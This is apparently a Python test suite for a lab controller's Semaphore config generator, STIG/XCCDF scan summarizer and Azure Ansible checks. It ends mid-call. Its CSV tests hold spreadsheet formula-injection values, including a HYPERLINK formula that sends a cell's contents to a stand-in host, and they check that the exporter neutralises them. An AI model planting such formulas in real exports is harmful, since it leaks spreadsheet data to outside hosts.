"""Offline checks for secret generation and assessment interpretation."""

import base64
import importlib.util
import json
import os
from pathlib import Path
import shutil
import stat
import subprocess
import tempfile
import unittest
import xml.etree.ElementTree as ET

import jinja2
import yaml


ROOT = Path(__file__).resolve().parents[1]


def load(name):
    # The controller's tools live in controller/; scripts/ keeps what the lab folder copies.
    folder = "controller" if (ROOT / "controller" / f"{name}.py").is_file() else "scripts"
    spec = importlib.util.spec_from_file_location(name, ROOT / folder / f"{name}.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


config_module = load("controller_config")
xccdf = load("summarize_xccdf")


class ConfigurationTests(unittest.TestCase):
    def test_runtime_secrets_are_unique_and_loopback_is_preserved(self):
        first, second = config_module.make_config(), config_module.make_config()
        self.assertNotEqual(first["postgres"]["pass"], second["postgres"]["pass"])
        self.assertEqual(first["interface"], "127.0.0.1")
        self.assertEqual(first["postgres"]["host"], "127.0.0.1:5432")
        for name in ("cookie_hash", "cookie_encryption", "access_key_encryption"):
            self.assertEqual(len(base64.b64decode(first[name])), 32)
            self.assertNotEqual(first[name], second[name])
        self.assertEqual(len({first[name] for name in ("cookie_hash", "cookie_encryption", "access_key_encryption")}), 3)
        self.assertIn("StrictHostKeyChecking=yes", first["env_vars"]["ANSIBLE_SSH_ARGS"])
        self.assertNotIn("IdentitiesOnly=yes", first["env_vars"]["ANSIBLE_SSH_ARGS"])

    def test_semaphore_ssh_options_keep_the_lab_connection_reuse(self):
        # ANSIBLE_SSH_ARGS replaces the lab ansible.cfg's ssh_args, so it must repeat them.
        def options(arguments):
            words = arguments.split()
            self.assertEqual(set(words[::2]), {"-o"})
            return words[1::2]

        line = next(line for line in (ROOT / "ansible.cfg").read_text().splitlines() if line.startswith("ssh_args"))
        lab = options(line.partition("=")[2])
        semaphore = options(config_module.make_config()["env_vars"]["ANSIBLE_SSH_ARGS"])
        self.assertIn("ControlPersist=60s", lab)
        self.assertLessEqual(set(lab), set(semaphore))
        self.assertEqual(set(semaphore) - set(lab), {"UserKnownHostsFile=/etc/semaphore/known_hosts"})

    def test_ssh_control_sockets_go_where_the_hardened_service_may_write(self):
        # Ansible keeps them in ~/.ansible/cp, and with user_home Semaphore keeps the unit's HOME.
        self.assertEqual(config_module.make_config()["home_dir_mode"], "user_home")
        for unit in ("semaphore.service", "semaphore-el9.service", "semaphore-runner.service"):
            with self.subTest(unit=unit):
                lines = (ROOT / "controller" / "templates" / unit).read_text().splitlines()
                self.assertIn("ProtectSystem=strict", lines)
                home = next(line for line in lines if line.startswith("Environment=HOME=")).partition("HOME=")[2]
                writable = next(line for line in lines if line.startswith("ReadWritePaths=")).partition("=")[2]
                sockets = Path(home, ".ansible", "cp")
                self.assertTrue(any(sockets.is_relative_to(path) for path in writable.split()), sockets)

    def test_private_write_refuses_overwrite(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "config.json"
            original = json.dumps(config_module.make_config())
            config_module.write_new(path, original)
            self.assertEqual(stat.S_IMODE(path.stat().st_mode), 0o600)
            with self.assertRaises(FileExistsError):
                config_module.write_new(path, "replacement")
            self.assertEqual(path.read_text(), original)

    def test_private_write_refuses_symlink(self):
        with tempfile.TemporaryDirectory() as directory:
            destination = Path(directory) / "elsewhere"
            link = Path(directory) / "config.json"
            link.symlink_to(destination)
            with self.assertRaises(FileExistsError):
                config_module.write_new(link, "replacement")
            self.assertFalse(destination.exists())


class AssessmentTests(unittest.TestCase):
    def result(self, rows, result_id="example-result"):
        return ET.fromstring(
            f'<TestResult xmlns="http://checklists.nist.gov/xccdf/1.2" id="{result_id}">'
            '<profile idref="example-profile"/>'
            + "".join(f'<rule-result idref="{rule}"><result>{outcome}</result></rule-result>' for rule, outcome in rows)
            + '</TestResult>'
        )

    def test_repeated_rule_can_have_mixed_outcomes(self):
        report = xccdf.summarize(self.result([("patch", "pass"), ("patch", "fail"), ("account", "notchecked")]))
        self.assertEqual(report["result_instances"], 3)
        self.assertEqual(report["unique_rule_ids"], 2)
        self.assertEqual(report["rules_with_repeated_instances"], 1)
        self.assertEqual(report["distinct_rule_ids_per_outcome"]["pass"], 1)
        self.assertEqual(report["distinct_rule_ids_per_outcome"]["fail"], 1)
        self.assertFalse(report["has_scanner_errors_or_unknowns"])

    def test_empty_assessment_is_rejected(self):
        with self.assertRaises(ValueError):
            xccdf.summarize(self.result([]))

    def test_selected_totals_leave_out_rules_the_profile_did_not_select(self):
        report = xccdf.summarize(self.result([("patch", "pass"), ("patch", "fail"), ("banner", "notapplicable"),
                                              ("usb", "notselected"), ("wifi", "notselected")]))
        self.assertEqual((report["result_instances"], report["unique_rule_ids"]), (5, 4))
        self.assertEqual((report["selected_result_instances"], report["selected_rule_ids"]), (3, 2))
        self.assertEqual(report["outcome_instances"]["notselected"], 2)
        # Readers of earlier summaries still find every key they used.
        self.assertLessEqual({"result_id", "profile", "result_instances", "unique_rule_ids",
                              "rules_with_repeated_instances", "outcome_instances",
                              "distinct_rule_ids_per_outcome", "has_scanner_errors_or_unknowns", "note"},
                             set(report))

    def test_assessment_that_selected_no_rule_is_rejected(self):
        with self.assertRaisesRegex(ValueError, "notselected"):
            xccdf.summarize(self.result([("usb", "notselected"), ("wifi", "notselected")]))
        # A selected rule that does not apply to this system was still assessed.
        report = xccdf.summarize(self.result([("usb", "notselected"), ("wifi", "notapplicable")]))
        self.assertEqual((report["selected_result_instances"], report["selected_rule_ids"]), (1, 1))

    def test_multiple_results_require_selection(self):
        root = ET.Element("container")
        root.append(self.result([("rule", "fail")], "before"))
        root.append(self.result([("rule", "pass")], "after"))
        with self.assertRaises(ValueError):
            xccdf.summarize(root)
        self.assertEqual(xccdf.summarize(root, "after")["outcome_instances"]["pass"], 1)
        with self.assertRaises(ValueError):
            xccdf.summarize(root, "missing")

    def test_error_and_unknown_are_not_compliance_failures(self):
        report = xccdf.summarize(self.result([("first", "error"), ("second", "unknown")]))
        self.assertTrue(report["has_scanner_errors_or_unknowns"])
        self.assertEqual(report["outcome_instances"]["fail"], 0)

    def test_unrecognized_outcome_is_rejected(self):
        with self.assertRaises(ValueError):
            xccdf.summarize(self.result([("rule", "success")]))


class AssessmentContentTests(unittest.TestCase):
    """What the summary says about the content, the failing rules and an exceptions file.

    The fixtures follow the layout of results that OpenSCAP 1.3 and Ubuntu's usg
    wrote for RHEL 9, AlmaLinux 9 and Ubuntu 24.04: a Benchmark that carries its
    profiles and rules, with one TestResult at its end.
    """

    NS = "http://checklists.nist.gov/xccdf/1.2"
    VENDOR = "xccdf_org.ssgproject.content_"
    HREF = "https://www.cyber.mil/stigs/downloads/?_dl_facet_stigs=operating-systems%2Cunix-linux"
    # rule, severity, STIG IDs, outcome
    RULES = (("grub2_password", "high", ["RHEL-09-212010"], "fail"),
             ("sshd_disable_empty_passwords", "high", ["RHEL-09-255040"], "pass"),
             ("package_aide_installed", "medium", ["RHEL-09-651010"], "fail"),
             ("partition_for_tmp", "low", ["RHEL-09-231015"], "fail"),
             ("audit_rules_login_events", "medium", ["RHEL-09-654250", "RHEL-09-654255"], "fail"),
             ("ensure_gpgcheck_local", "unknown", [], "fail"),
             ("banner_text", "medium", ["RHEL-09-211020"], "notchecked"),
             ("usb_storage", "medium", ["RHEL-09-291010"], "notselected"))

    def vendor(self, rules=RULES, profile_version="<version>V2R9</version>", profile="profile_stig"):
        rule_xml = "".join(
            f'<Rule id="{self.VENDOR}rule_{name}" severity="{severity}"><title>Title of {name}</title>'
            f'<reference href="https://www.cisecurity.org/controls/">12</reference>'
            + "".join(f'<reference href="{self.HREF}">{stig_id}</reference>' for stig_id in stig_ids) + "</Rule>"
            for name, severity, stig_ids, _outcome in rules)
        results = "".join(
            f'<rule-result idref="{self.VENDOR}rule_{name}" severity="{severity}"><result>{outcome}</result></rule-result>'
            for name, severity, _stig_ids, outcome in rules)
        return ET.fromstring(
            f'<Benchmark xmlns="{self.NS}" id="{self.VENDOR}benchmark_RHEL-9">'
            '<title>Guide to the Secure Configuration of Red Hat Enterprise Linux 9</title><version>0.1.82</version>'
            f'<Profile id="{self.VENDOR}profile_cis"><title>CIS</title></Profile>'
            f'<Profile id="{self.VENDOR}profile_stig">{profile_version}'
            '<title>DISA STIG for Red Hat Enterprise Linux 9</title></Profile>'
            f'<Group id="g">{rule_xml}</Group>'
            '<TestResult id="result" test-system="cpe:/a:redhat:openscap:1.3.14">'
            f'<benchmark href="/usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml" id="{self.VENDOR}benchmark_RHEL-9"/>'
            f'<profile idref="{self.VENDOR}{profile}"/>{results}</TestResult></Benchmark>')

    def tailoring(self, profiles=None):
        profiles = profiles if profiles is not None else (
            f'<Profile id="{self.VENDOR}profile_stig_site" extends="{self.VENDOR}profile_stig">'
            '<title>Site exceptions</title>'
            f'<select idref="{self.VENDOR}rule_partition_for_tmp" selected="false"/>'
            f'<select idref="{self.VENDOR}rule_grub2_password" selected="false"/>'
            f'<select idref="{self.VENDOR}rule_usb_storage" selected="true"/>'
            f'<set-value idref="{self.VENDOR}value_var_password_pam_minlen">15</set-value></Profile>')
        return ET.fromstring(f'<Tailoring xmlns="{self.NS}" id="xccdf_site_tailoring_default">'
                             '<benchmark href="/usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml"/>'
                             f'<version time="2026-11-13T00:00:00">1</version>{profiles}</Tailoring>')

    def test_the_vendor_profile_states_the_stig_release_it_follows(self):
        content = xccdf.summarize(self.vendor())["content"]
        self.assertEqual(content["stig_release"], "V2R9")
        self.assertEqual(content["benchmark_version"], "0.1.82")
        self.assertEqual(content["file"], "/usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml")
        self.assertEqual(content["line"],
                         "STIG release V2R9: profile 'DISA STIG for Red Hat Enterprise Linux 9' in 'Guide to the "
                         "Secure Configuration of Red Hat Enterprise Linux 9' 0.1.82, file "
                         "/usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml, scanner cpe:/a:redhat:openscap:1.3.14")

    def test_content_that_states_no_release_is_reported_as_such(self):
        content = xccdf.summarize(self.vendor(profile_version=""))["content"]
        self.assertIsNone(content["stig_release"])
        self.assertTrue(content["line"].startswith("STIG release not stated by the content: profile 'DISA STIG"))
        # A bare TestResult, without its benchmark, still summarizes.
        bare = ET.fromstring(f'<TestResult xmlns="{self.NS}" id="r"><profile idref="p"/>'
                             '<rule-result idref="a"><result>fail</result></rule-result></TestResult>')
        report = xccdf.summarize(bare)
        self.assertEqual(report["content"]["line"], "STIG release not stated by the content: profile 'p'")
        self.assertEqual(report["failed_by_category"], {"CAT I": 0, "CAT II": 0, "CAT III": 0, "unrated": 1})

    def test_a_disa_benchmark_states_its_release_in_its_version(self):
        root = ET.fromstring(
            f'<Benchmark xmlns="{self.NS}" id="xccdf_mil.disa.stig_benchmark_RHEL_9_STIG">'
            '<title>Red Hat Enterprise Linux 9 STIG SCAP Benchmark</title>'
            '<plain-text id="release-info">Benchmark Date: 30 Sep 2026</plain-text><version>002.010</version>'
            '<Profile id="xccdf_mil.disa.stig_profile_MAC-1_Classified"><title>I - Mission Critical Classified</title>'
            '</Profile><Group id="g"><Rule id="xccdf_mil.disa.stig_rule_SV-257777r1155676_rule" severity="high">'
            '<version>RHEL-09-211010</version><title>RHEL 9 must be a vendor-supported release.</title></Rule></Group>'
            '<TestResult id="r"><benchmark href="content.xml" id="xccdf_mil.disa.stig_benchmark_RHEL_9_STIG"/>'
            '<profile idref="xccdf_mil.disa.stig_profile_MAC-1_Classified"/>'
            '<rule-result idref="xccdf_mil.disa.stig_rule_SV-257777r1155676_rule" severity="high"><result>fail</result>'
            '</rule-result></TestResult></Benchmark>')
        report = xccdf.summarize(root)
        self.assertEqual(report["content"]["stig_release"], "V2R10")
        self.assertIn("STIG release V2R10 (Benchmark Date: 30 Sep 2026): profile 'I - Mission Critical Classified'",
                      report["content"]["line"])
        # DISA names the STIG ID in the rule's version.
        self.assertEqual(report["failed_cat_i_ids"], ["RHEL-09-211010"])
        self.assertEqual(report["failed_cat_i"],
                         ["RHEL-09-211010 (SV-257777r1155676_rule): RHEL 9 must be a vendor-supported release."])

    def test_failing_rules_are_counted_by_disa_category(self):
        report = xccdf.summarize(self.vendor())
        self.assertEqual(report["failed_by_category"], {"CAT I": 1, "CAT II": 2, "CAT III": 1, "unrated": 1})
        self.assertEqual(report["failed_cat_i"], ["RHEL-09-212010 (grub2_password): Title of grub2_password"])
        self.assertEqual(report["failed_cat_i_ids"], ["RHEL-09-212010"])
        # One rule can answer two STIG IDs; a slash keeps them together in a list of IDs.
        both = tuple((name, "high", ids, outcome) if name == "audit_rules_login_events" else (name, severity, ids, outcome)
                     for name, severity, ids, outcome in self.RULES)
        self.assertEqual(xccdf.summarize(self.vendor(both))["failed_cat_i_ids"],
                         ["RHEL-09-212010", "RHEL-09-654250/RHEL-09-654255"])
        # The counts of earlier summaries are unchanged by the new keys.
        self.assertEqual(report["outcome_instances"]["fail"], 5)
        self.assertEqual(report["selected_rule_ids"], 7)

    def test_open_rules_are_listed_most_severe_first_with_their_stig_ids(self):
        rows = xccdf.open_findings(self.vendor())
        self.assertEqual([(row["category"], row["result"], " ".join(row["stig_ids"])) for row in rows],
                         [("CAT I", "fail", "RHEL-09-212010"),
                          ("CAT II", "fail", "RHEL-09-651010"),
                          ("CAT II", "fail", "RHEL-09-654250 RHEL-09-654255"),
                          ("CAT II", "notchecked", "RHEL-09-211020"),
                          ("CAT III", "fail", "RHEL-09-231015"),
                          ("unrated", "fail", "")])
        # The full rule ID is what an exceptions file names.
        self.assertEqual(rows[0]["rule_id"], f"{self.VENDOR}rule_grub2_password")
        # Passing and unselected rules are not findings.
        self.assertNotIn(f"{self.VENDOR}rule_usb_storage", [row["rule_id"] for row in rows])

    def test_content_without_stig_ids_is_listed_by_rule_name(self):
        # Rocky Linux's data stream carries the RHEL 9 profile without STIG references.
        rules = tuple((name, severity, [], outcome) for name, severity, _ids, outcome in self.RULES)
        report = xccdf.summarize(self.vendor(rules))
        self.assertEqual(report["failed_cat_i_ids"], ["grub2_password"])
        self.assertEqual(report["failed_cat_i"], ["(grub2_password): Title of grub2_password"])

    def test_an_exceptions_file_is_described(self):
        described = xccdf.describe_tailoring(self.tailoring())
        self.assertEqual(described["profile_id"], f"{self.VENDOR}profile_stig_site")
        self.assertEqual(described["extends"], f"{self.VENDOR}profile_stig")
        self.assertEqual(described["left_out"], [f"{self.VENDOR}rule_grub2_password", f"{self.VENDOR}rule_partition_for_tmp"])
        self.assertEqual((described["left_out_count"], described["selected_count"], described["values_set"]), (2, 1, 1))
        self.assertEqual(described["benchmark"], "/usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml")

    def test_the_vendor_tools_own_files_are_read(self):
        # The shapes autotailor (openscap-utils 1.3.14) and usg 24.04.8 wrote in the November 2026 run.
        autotailor = ET.fromstring(
            '<?xml version="1.0" ?>\n'
            '<xccdf-1.2:Tailoring xmlns:xccdf-1.2="http://checklists.nist.gov/xccdf/1.2" id="xccdf_auto_tailoring_default">\n'
            '\t<xccdf-1.2:benchmark href="file:///usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml"/>\n'
            '\t<xccdf-1.2:version time="2026-11-13T11:16:53.448456">1</xccdf-1.2:version>\n'
            f'\t<xccdf-1.2:Profile id="{self.VENDOR}profile_stig_site" extends="{self.VENDOR}profile_stig">\n'
            '\t\t<xccdf-1.2:title override="false"/>\n'
            f'\t\t<xccdf-1.2:select idref="{self.VENDOR}rule_partition_for_tmp" selected="false"/>\n'
            f'\t\t<xccdf-1.2:select idref="{self.VENDOR}rule_grub2_password" selected="false"/>\n'
            '\t</xccdf-1.2:Profile>\n'
            '</xccdf-1.2:Tailoring>\n')
        described = xccdf.describe_tailoring(autotailor)
        self.assertEqual((described["profile_id"], described["extends"], described["title"]),
                         (f"{self.VENDOR}profile_stig_site", f"{self.VENDOR}profile_stig", ""))
        self.assertEqual((described["left_out_count"], described["selected_count"], described["values_set"]), (2, 0, 0))
        # usg lists every rule of the profile under a comment with its STIG ID, and every value the profile sets.
        usg = ET.fromstring(
            "<?xml version='1.0' encoding='UTF-8'?>\n"
            '<Tailoring xmlns="http://checklists.nist.gov/xccdf/1.2" id="xccdf_scap-workbench_tailoring_default">\n'
            '  <benchmark href="/usr/share/usg-benchmarks/ubuntu2404_STIG_1"/>\n'
            '  <version time="2026-02-27T13:02:25+00:00">1</version>\n'
            f'  <Profile id="{self.VENDOR}profile_stig_customized" extends="{self.VENDOR}profile_stig">\n'
            '    <title xmlns:xhtml="http://www.w3.org/1999/xhtml" xml:lang="en-US" override="true">'
            'DISA-STIG Benchmark [CUSTOMIZED]</title>\n'
            '    <!--UBTU-24-100010: Ubuntu 24.04 LTS must not have the "systemd-timesyncd" package installed.-->\n'
            f'    <select idref="{self.VENDOR}rule_package_timesyncd_removed" selected="true"/>\n'
            '    <!--UBTU-24-101000: Ubuntu 24.04 LTS must allow users to directly initiate a session lock.-->\n'
            f'    <select idref="{self.VENDOR}rule_vlock_installed" selected="false"/>\n'
            f'    <set-value idref="{self.VENDOR}value_var_password_pam_minlen">15</set-value>\n'
            f'    <set-value idref="{self.VENDOR}value_var_accounts_tmout">900</set-value>\n'
            '  </Profile>\n'
            '</Tailoring>\n')
        described = xccdf.describe_tailoring(usg)
        self.assertEqual(described["left_out"], [f"{self.VENDOR}rule_vlock_installed"])
        self.assertEqual((described["selected_count"], described["values_set"]), (1, 2))
        self.assertEqual((described["extends"], described["benchmark"], described["title"]),
                         (f"{self.VENDOR}profile_stig", "/usr/share/usg-benchmarks/ubuntu2404_STIG_1",
                          "DISA-STIG Benchmark [CUSTOMIZED]"))

    def test_a_file_that_is_no_single_profile_tailoring_is_refused(self):
        one = f'<Profile id="a" extends="{self.VENDOR}profile_stig"/>'
        for root, reason in ((self.vendor(), "root element is not Tailoring"),
                             (self.tailoring(""), "found 0"), (self.tailoring(one + one), "found 2"),
                             (self.tailoring('<Profile id="a"/>'), "the profile it extends")):
            with self.subTest(reason=reason):
                with self.assertRaisesRegex(ValueError, reason):
                    xccdf.describe_tailoring(root)

    def test_a_tailored_scan_names_the_release_of_the_profile_it_extends(self):
        tailoring = dict(xccdf.describe_tailoring(self.tailoring()), sha256="0" * 64)
        report = xccdf.summarize(self.vendor(profile="profile_stig_site"), tailoring=tailoring)
        self.assertEqual(report["profile"], f"{self.VENDOR}profile_stig_site")
        self.assertEqual(report["content"]["stig_release"], "V2R9")
        self.assertEqual(report["content"]["profile_id"], f"{self.VENDOR}profile_stig")
        self.assertEqual(report["tailoring"], {"tailoring_id": "xccdf_site_tailoring_default",
                                               "profile_id": f"{self.VENDOR}profile_stig_site",
                                               "extends": f"{self.VENDOR}profile_stig",
                                               "left_out_count": 2, "values_set": 1, "rules_refined_count": 0,
                                               "sha256": "0" * 64})
        # Without the file, the tailored profile is not in the benchmark, so no release is claimed.
        self.assertIsNone(xccdf.summarize(self.vendor(profile="profile_stig_site"))["content"]["stig_release"])

    def run_script(self, *arguments):
        return subprocess.run(["/usr/bin/python3", "-I", str(ROOT / "scripts" / "summarize_xccdf.py"), *arguments],
                              capture_output=True, text=True, check=False)

    def test_the_command_writes_the_findings_file_and_reads_an_exceptions_file(self):
        with tempfile.TemporaryDirectory() as directory:
            folder = Path(directory)
            (folder / "audit.xml").write_bytes(ET.tostring(self.vendor(profile="profile_stig_site")))
            (folder / "tailoring.xml").write_bytes(ET.tostring(self.tailoring()))
            done = self.run_script(str(folder / "audit.xml"), "--findings", str(folder / "audit-findings.csv"),
                                   "--tailoring", str(folder / "tailoring.xml"))
            self.assertEqual((done.returncode, done.stderr), (0, ""))
            report = json.loads(done.stdout)
            self.assertEqual((report["findings_file"], report["findings_listed"]),
                             (str(folder / "audit-findings.csv"), 6))
            self.assertEqual(report["tailoring"]["left_out_count"], 2)
            lines = (folder / "audit-findings.csv").read_text().splitlines()
            self.assertEqual(lines[0], "category,severity,result,stig_id,rule_id,title")
            self.assertEqual(lines[1], f"CAT I,high,fail,RHEL-09-212010,{self.VENDOR}rule_grub2_password,"
                                       "Title of grub2_password")
            self.assertEqual(len(lines), 7)
            # The file alone: what the playbook reads before it scans.
            alone = self.run_script("--tailoring", str(folder / "tailoring.xml"))
            self.assertEqual(alone.returncode, 0)
            described = json.loads(alone.stdout)
            self.assertEqual(described["extends"], f"{self.VENDOR}profile_stig")
            self.assertRegex(described["sha256"], "^[0-9a-f]{64}$")
            for arguments, message in (((str(folder / "audit.xml"), "--tailoring", str(folder / "audit.xml")),
                                        "Cannot read the tailoring file: Not an XCCDF 1.2 tailoring file"),
                                       (("--tailoring", str(folder / "missing.xml")), "Cannot read the tailoring file"),
                                       ((), "name a results file")):
                with self.subTest(arguments=arguments):
                    refused = self.run_script(*arguments)
                    self.assertIn(refused.returncode, (1, 2))
                    self.assertEqual(refused.stdout, "")
                    self.assertIn(message, refused.stderr)

    def test_no_cell_can_run_as_a_spreadsheet_formula(self):
        # Every cell comes from the scanned machine's results file, the severity and the rule ID included.
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "findings.csv"
            xccdf.write_findings(path, [{"category": "unrated", "severity": '=hyperlink("http://x/"&a1)', "result": "fail",
                                         "stig_ids": ["+1"], "rule_id": "\t=1+1", "title": '=HYPERLINK("http://x","y")'},
                                        {"category": "CAT I", "severity": "high", "result": "fail", "stig_ids": [],
                                         "rule_id": "  @sum(a1)", "title": "-2+3"},
                                        {"category": "CAT II", "severity": "medium", "result": "fail",
                                         "stig_ids": ["RHEL-09-212010"], "rule_id": "rule_a-b", "title": "Plain title"}])
            import csv
            with open(path, newline="", encoding="utf-8") as handle:
                rows = list(csv.reader(handle))[1:]
            self.assertEqual(rows[0], ["unrated", """'=hyperlink("http://x/"&a1)""", "fail", "'+1", "'\t=1+1",
                                       """'=HYPERLINK("http://x","y")"""])
            self.assertEqual(rows[1][4:], ["'  @sum(a1)", "'-2+3"])
            # An ordinary row is written as it is.
            self.assertEqual(rows[2], ["CAT II", "medium", "fail", "RHEL-09-212010", "rule_a-b", "Plain title"])

    def test_a_severity_from_the_results_file_reaches_the_findings_file_guarded(self):
        # Written as it stands in an XML attribute: =HYPERLINK("http://x/"&A1)
        rules = (("grub2_password", "=HYPERLINK(&quot;http://x/&quot;&amp;A1)", ["RHEL-09-212010"], "fail"),)
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "findings.csv"
            xccdf.write_findings(path, xccdf.open_findings(self.vendor(rules)))
            import csv
            with open(path, newline="", encoding="utf-8") as handle:
                row = list(csv.reader(handle))[1]
            self.assertEqual(row[:3], ["unrated", """'=hyperlink("http://x/"&a1)""", "fail"])

    def test_a_file_in_an_encoding_python_does_not_know_is_refused_in_one_line(self):
        with tempfile.TemporaryDirectory() as directory:
            odd = Path(directory) / "odd.xml"
            odd.write_bytes(b'<?xml version="1.0" encoding="no-such-encoding"?><Tailoring/>')
            for arguments, message in ((("--tailoring", str(odd)), "Cannot read the tailoring file: "),
                                       ((str(odd),), "Cannot summarize assessment: ")):
                with self.subTest(arguments=arguments[0]):
                    refused = self.run_script(*arguments)
                    self.assertEqual((refused.returncode, refused.stdout), (1, ""))
                    self.assertTrue(refused.stderr.startswith(message), refused.stderr)
                    self.assertNotIn("Traceback", refused.stderr)

    def test_what_a_file_changes_is_counted_however_it_is_written(self):
        # selected is an XML boolean, and refine-rule can stop a rule's check without unselecting it.
        profile = (f'<Profile id="{self.VENDOR}profile_stig_site" extends="{self.VENDOR}profile_stig">'
                   f'<select idref="{self.VENDOR}rule_a" selected="0"/>'
                   f'<select idref="{self.VENDOR}rule_b" selected="false"/>'
                   f'<select idref="{self.VENDOR}rule_c" selected="1"/>'
                   f'<select idref="{self.VENDOR}rule_d" selected="true"/>'
                   f'<refine-rule idref="{self.VENDOR}rule_e" role="unchecked"/>'
                   f'<refine-rule idref="{self.VENDOR}rule_f" severity="low"/></Profile>')
        described = xccdf.describe_tailoring(self.tailoring(profile))
        self.assertEqual(described["left_out"], [f"{self.VENDOR}rule_a", f"{self.VENDOR}rule_b"])
        self.assertEqual((described["left_out_count"], described["selected_count"]), (2, 2))
        self.assertEqual(described["rules_refined"], [f"{self.VENDOR}rule_e", f"{self.VENDOR}rule_f"])
        self.assertEqual(described["rules_refined_count"], 2)

    def test_the_script_keeps_to_the_syntax_of_enterprise_linux_9s_python(self):
        # The playbook runs it with /usr/bin/python3, which is Python 3.9 on RHEL, AlmaLinux and Rocky Linux 9.
        import ast
        ast.parse((ROOT / "scripts" / "summarize_xccdf.py").read_text(), feature_version=(3, 9))


class AzureDiskTests(unittest.TestCase):
    """Offline checks of the Azure examples: disk sizes, plans, the preflight, images, NSG rules and VM jobs.

    Azure refuses an OS disk smaller than its image; Red Hat's RHEL 9 images are 64 GB.
    """

    PUBLIC_KEY = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7 lab@example.test"
    KEY_FILE_TASK = "Refuse a key file that is missing or holds anything but one public key"
    TAG_TASK = "Refuse an expiry-free or owner-free tag set"
    # A stand-in for azure_rm_virtualmachine: it records when it ran and creates a VM once, or fails.
    STAND_IN_VM = """#!/usr/bin/python
import os, time
from ansible.module_utils.basic import AnsibleModule

module = AnsibleModule(argument_spec=dict(name=dict(type='str', required=True),
                                          state_dir=dict(type='path', required=True),
                                          fail=dict(type='bool', default=False)))
name = module.params['name']
marker = os.path.join(module.params['state_dir'], name)
if os.path.exists(marker):
    module.exit_json(changed=False)
started = time.time()
time.sleep(3)
if module.params['fail']:
    module.fail_json(msg='Error creating or updating virtual machine %s - (QuotaExceeded) no quota' % name)
with open(marker, 'w') as times:
    times.write('%f %f' % (started, time.time()))
module.exit_json(changed=True)
"""

    def tasks(self, playbook):
        content = yaml.safe_load((ROOT / "platforms" / "azure" / playbook).read_text())
        return content[0]["tasks"] if "hosts" in content[0] else content

    def disk_expression(self, playbook, task_prefix):
        tasks = self.tasks(playbook)
        task = next(t for t in tasks if t["name"].startswith(task_prefix))
        return task["azure.azcollection.azure_rm_virtualmachine"]["os_disk_size_gb"]

    def render(self, expression, **variables):
        environment = jinja2.Environment(undefined=jinja2.StrictUndefined)
        return int(environment.from_string(expression).render(**variables).strip())

    def render_tree(self, value, **variables):
        if isinstance(value, dict):
            return {key: self.render_tree(item, **variables) for key, item in value.items()}
        if isinstance(value, list):
            return [self.render_tree(item, **variables) for item in value]
        if isinstance(value, str):
            return jinja2.Environment(undefined=jinja2.StrictUndefined).from_string(value).render(**variables)
        return value

    def run_playbook(self, work, plays, **environment):
        (work / "ansible.cfg").write_text("[defaults]\n")
        (work / "check.yml").write_text(yaml.safe_dump(plays))
        environment = dict(os.environ, ANSIBLE_LOCALHOST_WARNING="False", ANSIBLE_INVENTORY_UNPARSED_WARNING="False",
                           ANSIBLE_CONFIG=str(work / "ansible.cfg"), **environment)
        return subprocess.run(["ansible-playbook", "-i", "localhost,", "-c", "local", "check.yml"],
                              capture_output=True, text=True, timeout=300, cwd=work, env=environment)

    def failed_tasks(self, work, cases):
        """Run each case's tasks with its variables through Ansible.

        Map each failing case to its failed task's name and the messages of its failed items.
        """
        record = "{{ failures | combine({'%s': [ansible_failed_task.name, ansible_failed_result]}) }}"
        blocks = [{"name": f"Case {name}", "vars": variables, "block": tasks,
                   "rescue": [{"ansible.builtin.set_fact": {"failures": record % name}}]}
                  for name, (tasks, variables) in cases.items()]
        save = {"ansible.builtin.copy": {"content": "{{ failures | to_json }}", "dest": str(work / "failed.json")}}
        result = self.run_playbook(work, [{"hosts": "localhost", "gather_facts": False, "tasks": blocks + [save],
                                           "vars": {"ansible_python_interpreter": "{{ ansible_playbook_python }}",
                                                    "failures": {}}}])
        self.assertEqual(result.returncode, 0, result.stdout[-3000:] + result.stderr[-2000:])
        failures = json.loads((work / "failed.json").read_text())
        return {name: (task, [item.get("msg") for item in failed.get("results", [failed]) if item.get("failed")])
                for name, (task, failed) in failures.items()}

    def failed_task_names(self, found):
        return {name: task for name, (task, _messages) in found.items()}

    def test_an_unquoted_expiry_date_passes_the_tag_check_and_an_empty_one_does_not(self):
        task = next(t for t in self.tasks("tasks-preflight.yml") if t["name"] == self.TAG_TASK)
        environment = jinja2.Environment(undefined=jinja2.StrictUndefined)
        # YAML reads 2026-10-31 as a date, which has no length; quoted, it stays text.
        for line, accepted in (("expires: 2026-10-31", True), ("expires: 2026-10-31T18:00:00Z", True),
                               ('expires: "2026-10-31"', True), ("expires:", False), ('expires: ""', False),
                               ("purpose: lab", False)):
            tags = {"owner": "lab", **yaml.safe_load(line)}
            with self.subTest(line=line):
                results = [environment.from_string("{{ " + condition + " }}").render(azure_tags=tags)
                           for condition in task["ansible.builtin.assert"]["that"]]
                self.assertEqual(results, ["True", str(accepted)])

    def test_https_is_opened_only_from_the_given_prefix_and_ahead_of_the_deny_rule(self):
        play = yaml.safe_load((ROOT / "platforms" / "azure" / "controller.yml").read_text())[0]
        task = next(t for t in play["tasks"] if t["name"].startswith("Network security group"))
        self.assertIs(task["azure.azcollection.azure_rm_securitygroup"]["purge_rules"], True)
        expression = task["azure.azcollection.azure_rm_securitygroup"]["rules"].strip()
        expression = "{{ (" + expression.removeprefix("{{").removesuffix("}}") + ") | tojson }}"
        operator, own = ".".join(["198", "51", "100", "7"]) + "/32", ".".join(["203", "0", "113", "0"]) + "/24"
        for https_cidr in (None, "", own):
            controller = {"operator_cidr": operator} | ({} if https_cidr is None else {"https_cidr": https_cidr})
            with self.subTest(https_cidr=https_cidr):
                rules = json.loads(jinja2.Environment(undefined=jinja2.StrictUndefined).from_string(expression).render(
                    azure_controller=controller,
                    controller_rules=self.render_tree(play["vars"]["controller_rules"], azure_controller=controller),
                    controller_https_rules=self.render_tree(play["vars"]["controller_https_rules"],
